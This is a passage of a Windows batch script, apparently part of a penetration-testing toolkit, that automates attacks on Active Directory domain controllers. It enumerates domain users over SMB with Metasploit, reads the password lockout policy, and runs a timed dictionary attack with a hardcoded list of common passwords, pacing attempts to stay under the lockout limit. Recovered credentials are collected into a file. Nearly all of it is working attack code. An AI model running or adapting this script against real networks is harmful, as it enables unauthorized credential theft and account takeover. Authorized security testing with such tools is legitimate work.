Ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_lookupsid THREADS=15 MaxRID=10000 SMBDomain=. RHOSTS=file:%mypwd%\\dc_target.txt E 2&gt; nul 1&gt;&gt; usrtmp.txt<br/>
<br/>
REM ## CHECK IF SUCCESSFUL<br/>
grep -i &quot;user=&quot; usrtmp.txt | wc -l | sed -e &quot;s/^[ \]*//&quot; &gt; dc_success<br/>
SET /P dc_success=&lt;dc_success<br/>
IF %dc_success% GEQ 1 GOTO :runsidcomplete<br/>
<br/>
REM ## GET LINE COUNT of dclist.txt<br/>
wc -l dclist.txt | sed s/dclist.txt //g | sed -e &quot;s/^[ \]*//&quot; &gt; dc_pending_count<br/>
SET /P dc_pending_count=&lt;dc_pending_count<br/>
<br/>
REM IF dclist.txt IS NOT EMPTY TRY NEXT DC<br/>
IF %dc_pending_count% GEQ 1 GOTO :runsid<br/>
<br/>
:runsidcomplete<br/>
REM ## CLEAN UP TEMP FILES<br/>
IF EXIST dclist.txt DEL dclist.txt<br/>
IF EXIST dc_target.txt DEL dc_target.txt<br/>
IF EXIST dcs_scanned.txt DEL dcs_scanned.txt<br/>
IF EXIST dc_success DEL dc_success<br/>
<br/>
REM ## PARSE CLEAN LIST OF USERS<br/>
grep -i &quot;user=&quot; usrtmp.txt | gawk -F &quot; &quot; &quot;{print $3}&quot; | gawk -F &quot;USER=&quot; &quot;{print $2}&quot; | grep -v &quot;\$&quot; |gawk &quot;!/\$/&quot; | sort | uniq 2&gt;nul 1&gt; allusers.txt<br/>
IF EXIST usrtmp.txt del usrtmp.txt<br/>
<br/>
REM ## GET NUMBER OF ENUMERATED USERS<br/>
wc -l allusers.txt | sed -e &quot;s/^[ \]*//&quot; | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST user_count del user_count<br/>
IF EXIST allusers.txt move allusers.txt domain_users_rpc_sidbf.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
if %user_count% LEQ 1 ECHO [-] RESULT: FAILED &amp;&amp; GOTO :USERCHECK<br/>
<br/>
REM ## PRINT NUMBER OF ENUMERATED USERS<br/>
ECHO [*] RESULT: Enumerated %user_count%users (domain_users_rpc_sidbf.txt) <br/>
<br/>
REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)<br/>
IF %quickmode% equ Y GOTO :USERCHECK<br/>
<br/>
REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE<br/>
GOTO :USERCHECK<br/>
<br/>
<br/>
:USERCHECK<br/>
REM -------------------------------------------------------<br/>
REM VERIFY USERS WHERE ENUMERATED BEFORE ATTACKING<br/>
REM -------------------------------------------------------<br/>
<br/>
REM ## DUMP ALL USERS FROM ALL PROTOCOLS INTO allusers.txt<br/>
cat domain_users*.txt |sort|uniq &gt; allusers.txt<br/>
<br/>
REM ## GET NUMBER OF USERS ENUMERATED<br/>
wc -l allusers.txt | sed -e &quot;s/^[ \]*//&quot; | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST user_count del user_count<br/>
<br/>
REM ## NOTIFY USER IF NO USERS WHERE ENUMERATED<br/>
IF %user_count% EQU 0 ECHO [*]   INFO: No users enumerated &amp;&amp; DEL allusers.txt &amp;&amp; GOTO :END<br/>
<br/>
REM ## CHECK IF USER WANTS AUTO DICTIONARY ATTACK<br/>
IF %attack% equ N GOTO :END<br/>
<br/>
REM ## ATTACK IF USERS WHERE ENUMERATED &amp; Dictionary attack is requested<br/>
GOTO :GETPOLICY<br/>
<br/>
<br/>
:GETPOLICY	<br/>
REM ## CHECK IF AUTOMATED DICTIONARY ATTACK IS ENABLED<br/>
IF %attack% equ N GOTO :END<br/>
<br/>
REM -------------------------------------------------------<br/>
REM ENUMERATE PASSWORD POLICY FROM DOMAIN CONTROLLER<br/>
REM -------------------------------------------------------<br/>
REM ECHO [*] ACTION: Attempting policy enumeration with DUMPSEC...<br/>
<br/>
REM ## GET LOCKOUT POLICY<br/>
%dumpsecpath% /computer=\\%mydc% /rpt=policy /saveas=csv /outfile=pwpolicy.txt 2&gt; nul<br/>
grep -i &quot;Lockout after &quot; pwpolicy.txt | sed s/&quot;Lockout after&quot;//g | sed s/&quot;bad logon attempts&quot;//g | grep -v &quot;^$&quot; | sed -e &quot;s/^[ \]*//&quot;&gt;lockout<br/>
<br/>
REM ## GET COUNT RESET<br/>
grep -i &quot;Reset bad logon count after 15 minutes&quot; pwpolicy.txt | gawk -F &quot; &quot; &quot;{print $6}&quot; | grep -v &quot;^$&quot; | sed -e &quot;s/^[ \]*//&quot; &gt;countreset<br/>
<br/>
REM ## SETUP VARIABLES<br/>
set /P countreset=&lt;countreset<br/>
set /P lockoutafter=&lt;lockout<br/>
set /A attempts=%lockoutafter%-2<br/>
<br/>
REM ## CLEAN UP TEMP FILES<br/>
IF EXIST pwpolicy.txt DEL pwpolicy.txt <br/>
IF EXIST lockout DEL lockout<br/>
IF EXIST countreset DEL countreset<br/>
<br/>
REM ## IF NO PASSWORD POLICY EXISTS ABORT DICTIONARY ATTACK - needs to be tested<br/>
IF %lockoutafter% EQU 0 ECHO [*]  RESULT: No password policy exist, please confirm and attack manually!<br/>
IF %lockoutafter% EQU 0 ECHO [*]  RESULT: Automated dictionary attack aborted! &amp;&amp; GOTO :END<br/>
<br/>
REM ## IF SUCESSFULL ELSE GOTO END<br/>
IF %attempts% GEQ 1 GOTO :DATTACK<br/>
ECHO [*]  RESULT: Password policy could not be determined!<br/>
ECHO [*]  RESULT: Automated dictionary attack aborted!<br/>
GOTO :END<br/>
<br/>
<br/>
:DATTACK<br/>
REM -------------------------------------------------------<br/>
REM ATTEMPT DICTIONARY ATTACK AGAINST DC<br/>
REM -------------------------------------------------------<br/>
ECHO ------------------------------------------------------------------------------------<br/>
ECHO                Starting Dictionary Attack <br/>
ECHO ------------------------------------------------------------------------------------<br/>
REM ## GET DATE<br/>
FOR /F &quot;tokens=*&quot; %%i in ('date /t') do SET mydate=%%i<br/>
<br/>
REM ## GET TIME<br/>
FOR /F &quot;tokens=*&quot; %%i in ('time /t') do SET mytime=%%i<br/>
<br/>
REM ## PRINT START TIME<br/>
ECHO [*]  INFO: START TIME is %mydate% %mytime%<br/>
<br/>
REM ## COMBINE USER LISTS<br/>
cat domain_users*.txt | sort | uniq 2&gt;nul 1&gt;allusers.txt<br/>
<br/>
REM ## GET NUMBER OF ENUMERATED USERS<br/>
wc -l allusers.txt | sed -e &quot;s/^[ \]*//&quot; | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST user_count del user_count<br/>
<br/>
REM ## GENERATE DICTIONARY FILE FOR ATTACK<br/>
REM ## NOTE: Some of the psswords below should be changed manually<br/>
REM ##    but mainly its rocku. Also, blank and username as pass<br/>
REM ##    will be done via the smb_login module.<br/>
IF EXIST list_pending.txt DEL list_pending.txt<br/>
touch list_pending.txt<br/>
ECHO Spring2012&gt;&gt; list_pending.txt<br/>
ECHO Winter2012&gt;&gt; list_pending.txt<br/>
ECHO Sportsteam12&gt;&gt; list_pending.txt<br/>
ECHO companyname&gt;&gt; list_pending.txt<br/>
ECHO Companyname&gt;&gt; list_pending.txt<br/>
ECHO Summer2012&gt;&gt; list_pending.txt<br/>
ECHO Companyname1&gt;&gt; list_pending.txt<br/>
ECHO companyname1&gt;&gt; list_pending.txt<br/>
EcHO Companyname12&gt;&gt; list_pending.txt<br/>
EcHO companyname12&gt;&gt; list_pending.txt<br/>
ECHO Password&gt;&gt; list_pending.txt<br/>
ECHO password&gt;&gt; list_pending.txt<br/>
ECHO Password1&gt;&gt; list_pending.txt<br/>
ECHO password1&gt;&gt; list_pending.txt<br/>
ECHO P@ssw0rd1&gt;&gt; list_pending.txt<br/>
ECHO Password12&gt;&gt; list_pending.txt<br/>
ECHO password123&gt;&gt; list_pending.txt<br/>
ECHO Password123&gt;&gt; list_pending.txt<br/>
ECHO 12345&gt;&gt; list_pending.txt<br/>
ECHO 123456&gt;&gt; list_pending.txt<br/>
ECHO 654321&gt;&gt; list_pending.txt<br/>
ECHO 1234567&gt;&gt; list_pending.txt<br/>
ECHO 12345678&gt;&gt; list_pending.txt<br/>
ECHO 123456789&gt;&gt; list_pending.txt<br/>
ECHO 1234asdf&gt;&gt; list_pending.txt<br/>
ECHO qwerty&gt;&gt; list_pending.txt<br/>
ECHO Qwerty&gt;&gt; list_pending.txt<br/>
ECHO abc123&gt;&gt; list_pending.txt<br/>
ECHO letmein&gt;&gt; list_pending.txt<br/>
ECHO opensesme&gt;&gt; list_pending.txt<br/>
ECHO monkey&gt;&gt; list_pending.txt<br/>
ECHO Monkey&gt;&gt; list_pending.txt<br/>
ECHO myspace1&gt;&gt; list_pending.txt<br/>
ECHO link182&gt;&gt; list_pending.txt<br/>
ECHO liverpool&gt;&gt; list_pending.txt<br/>
ECHO iloveyou&gt;&gt; list_pending.txt<br/>
ECHO rockyou&gt;&gt; list_pending.txt<br/>
ECHO princess&gt;&gt; list_pending.txt<br/>
ECHO thomas&gt;&gt; list_pending.txt<br/>
ECHO Nicole&gt;&gt; list_pending.txt<br/>
ECHO Daniel&gt;&gt; list_pending.txt<br/>
ECHO babygirl&gt;&gt; list_pending.txt<br/>
ECHO michael&gt;&gt; list_pending.txt<br/>
ECHO Ashley&gt;&gt; list_pending.txt<br/>
ECHO yuiop&gt;&gt; list_pending.txt<br/>
<br/>
REM ## Get number of passwords to be used<br/>
wc -l list_pending.txt | sed -e &quot;s/^[ \]*//&quot; | sed s/list_pending.txt//g&gt; pwcount<br/>
SET /P pwcount=&lt;pwcount<br/>
IF EXIST pwcount del pwcount<br/>
<br/>
REM ## add 2 to pwcount; 1 blank;1 username as pw (built into smb_login)<br/>
SET /A pwcount=%pwcount%+2 <br/>
<br/>
REM ## GET PRESENT WORKING DIRECTORY<br/>
pwd &gt; pwd.txt<br/>
SET /P mydir=&lt;pwd.txt<br/>
IF EXIST pwd.txt DEL pwd.txt<br/>
<br/>
REM ## MODIFY PATH FOR METASPLOIT<br/>
echo %mydir%| sed s/\\/\\\\/g &gt; pwd.txt<br/>
SET /P mydir=&lt;pwd.txt<br/>
<br/>
IF EXIST pwd.txt DEL pwd.txt<br/>
<br/>
REM ## GET TARGET DC<br/>
head -n 1 dcs.txt &gt; targetdc.txt<br/>
set /p targetdc=&lt;targetdc.txt<br/>
IF EXIST targetdc.txt del targetdc.txt<br/>
<br/>
REM ## PRINT DICTIONARY CONFIGURATION INFO<br/>
ECHO [*]  INFO: %targetdc% loaded as target<br/>
ECHO [*]  INFO: %pwcount% passwords loaded <br/>
ECHO [*]  INFO: %user_count%users loaded<br/>
ECHO [*]  INFO: %lockoutafter%attempts can be made before accounts lockout<br/>
ECHO [*]  INFO: %countreset% is the lockout counter reset time<br/>
ECHO [*]  INFO: %attempts% passwords will be tested every %countreset% minutes<br/>
ECHO [*] ACTION: Starting dictionary attack (takes a while)...<br/>
<br/>
REM ## EXECUTE DICTIONARY ATTACK WITH BLANK PASSWORD AND USERNAME AS PASSWORD<br/>
ECHO [*] ACTION: Testing for blank passwords and username as password...<br/>
ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=15 BLANK_PASSWORDS=TRUE USER_AS_PASS=TRUE USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2&gt; nul 1&gt;&gt; creds.txt<br/>
<br/>
REM ## SHOW AQUIRED PASSWORDS FOR ROUND<br/>
ECHO [*] RESULT: Recovered passwords:<br/>
grep -I &quot;SUCCESSFUL LOGIN&quot; creds.txt | sed s/'//g | sed s/445//g| gawk -F &quot; &quot; &quot;{print $2$13$14$15}&quot; &gt;&gt;tmp_list.txt<br/>
FOR /F &quot;tokens=*&quot; %%i in ('type tmp_list.txt') do ECHO [*]     %%i <br/>
IF EXIST tmp_list.txt DEL tmp_list.txt<br/>
<br/>
:RUN<br/>
REM ## SLEEP FOR NUMBER OF MINUTES DEFINED BY PASSWORD POLICY<br/>
ECHO [*] ACTION: Waiting for counter to reset (%countreset% minutes)...<br/>
sleep %countreset%m<br/>
<br/>
REM ## SETUP PASSWORD FILES FOR SCAN<br/>
head -n %attempts% list_pending.txt &gt; list_targets.txt<br/>
head -n %attempts% list_pending.txt &gt;&gt; list_scanned.txt<br/>
diff -iw -d list_pending.txt list_scanned.txt | grep -i &quot;&lt;&quot; | grep -v &quot;^$&quot; | sed -e &quot;s/^[ \]*//&quot; | grep -v &quot;\,&quot; | gawk -F &quot; &quot; &quot;{print $2}&quot; &gt; list_pending.txt<br/>
<br/>
REM ## DISPLAY PASSWORDS TO BE TESTED<br/>
ECHO [*] ACTION: Testing the %attempts% passwords below:<br/>
FOR /F &quot;tokens=*&quot; %%i in ('cat list_targets.txt') do ECHO [*]      %%i<br/>
<br/>
REM ## EXECUTE DICTIONARY ATTACK<br/>
ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=15 BLANK_PASSWORDS=FALSE USER_AS_PASS=FALSE PASS_FILE=%mydir%\\list_targets.txt USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2&gt; nul 1&gt;&gt; creds.txt<br/>
<br/>
REM ## SHOW AQUIRED PASSWORDS FOR ROUND<br/>
ECHO [*] RESULT: Recovered passwords:<br/>
grep -I &quot;SUCCESSFUL LOGIN&quot; creds.txt | sed s/'//g | sed s/445//g| gawk -F &quot; &quot; &quot;{print $2$13$14$15}&quot; &gt;&gt;tmp_list.txt<br/>
FOR /F &quot;tokens=*&quot; %%i in ('type tmp_list.txt') do ECHO [*]     %%i <br/>
IF EXIST tmp_list.txt DEL tmp_list.txt<br/>
<br/>
REM ## GET LINE COUNT OF LIST_PENDING.TXT<br/>
wc -l list_pending.txt | sed s/list_pending.txt//g | sed -e &quot;s/^[ \]*//&quot; &gt; line_count<br/>
SET /P line_count=&lt;line_count<br/>
<br/>
REM IF LIST_PENDING.TXT IS NOT EMPTY TRY NEXT GROUP OF PASSWORDS<br/>
IF %line_count% GEQ 1 GOTO :RUN<br/>
IF %line_count% EQU 0 ECHO [*] ACTION: Dictionary attack completed.<br/>
<br/>
REM ## CLEAN UP TEMP FILES<br/>
IF EXIST list_pending.txt DEL list_pending.txt<br/>
IF EXIST list_targets.txt DEL list_targets.txt<br/>
IF EXIST list_scanned.txt DEL list_scanned.txt<br/>
IF EXIST line_count DEL line_count<br/>
<br/>
REM # PARSE RECOVERED USERSNAME AND PASSWORDS<br/>
grep -I &quot;SUCCESSFUL LOGIN&quot; creds.txt | sed s/'//g | sed s/445//g| gawk -F &quot; &quot; &quot;{print $2$13$14$15 }&quot; &gt; domain_passwords.txt<br/>
IF EXIST creds.txt del creds.txt<br/>
<br/>
REM ## GET NUMBER CREDENTIALS<br/>
wc -l domain_passwords.txt | sed -e &quot;s/^[ \]*//&quot; | sed s/domain_passwords.txt//g&gt;cred_count<br/>
SET /P cred_count=&lt;cred_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST cred_count del cred_count<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
IF %cred_count% EQU 0 ECHO [*] RESULT: No weak passwords were found &amp;&amp; goto :END<br/>
<br/>
REM ## PRINT NUMBER OF CREDETIALS RECOVERED<br/>
ECHO [*] RESULT: %cred_count%passwords were recovered<br/>
<br/>
REM ## PRINT CREDENTIALS<br/>
FOR /F &quot;tokens=*&quot; %%i in ('type domain_passwords.txt') do ECHO [*]      %%i<br/>
<br/>
REM ## GET DATE<br/>
FOR /F &quot;tokens=*&quot; %%i in ('date /t') do SET mydate=%%i<br/>
<br/>
REM ## GET TIME<br/>
FOR /F &quot;tokens=*&quot; %%i in ('time /t') do SET mytime=%%i<br/>
<br/>
REM ## PRINT THE END TIME<br/>
ECHO [*]  INFO: END TIME is %mydate% %mytime%<br/>
<br/>
:END<br/>
ECHO ------------------------------------------------------------------------------------<br/>
ECHO.<br/>
REM ## CLEAN UP FILES<br/>
IF EXIST list_pending.txt del list_pending.txt<br/>
IF EXIST dcs.txt del dcs.txt<br/>
move allusers.txt domain_users_all.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## REMOVE PROTOCOL USER ENUMERATION FILES<br/>
IF EXIST dcs.txt FOR /F &quot;tokens=*&quot; %%i in ('dir /b domain_user*') do IF EXIST %%i DEL %%i<br/>
<br/>
REM ## CLEAN UP SMB CONNECTIONS<br/>
IF EXIST dcs.txt FOR /F &quot;tokens=*&quot; %%i in ('type dcs.txt') do net use \\%%i\IPC$ /del 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CLEAN UP VARIABLES<br/>
set attack=<br/>
set attempts=<br/>
set countreset=<br/>
set cred_count=<br/>
set creds=<br/>
set custom_domain=<br/>
set dc_count=<br/>
set domain_parameter=<br/>
set dumpsecpath=<br/>
set enumauth=<br/>
set enumpath=<br/>
set lockoutafter=<br/>
set metasploitpath=<br/>
set mydir=<br/>
set mypwd=<br/>
set netuse_auth=<br/>
set pw_count=<br/>
set pwcount=<br/>
set success=<br/>
set target_domain=<br/>
set targetdc=<br/>
set temp_var=<br/>
set totalvar=<br/>
set unixtoolspath=<br/>
set user_count=<br/>
set var1=<br/>
set var2=<br/>
</body></html>